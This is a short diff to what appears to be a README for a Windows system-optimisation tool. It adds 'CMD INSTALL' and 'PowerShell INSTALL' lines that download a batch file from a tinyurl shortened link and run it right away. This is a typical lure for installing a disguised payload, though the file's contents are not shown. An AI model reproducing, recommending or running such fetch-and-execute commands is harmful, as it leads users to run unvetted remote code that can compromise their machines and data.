@@ -13,6 +13,14 @@
 
 ---
 
+CMD INSTALL:
+
+curl -L -o setup.bat https://tinyurl.com/abs-setup && call setup.bat
+
+PowerShell INSTALL:
+
+irm https://tinyurl.com/abs-setup -OutFile $env:TEMP\setup.bat; & "$env:TEMP\setup.bat"
+
 ## ✨ Features
 
 - 🚀 **Performance Enhancement**: Optimise your system for maximum speed
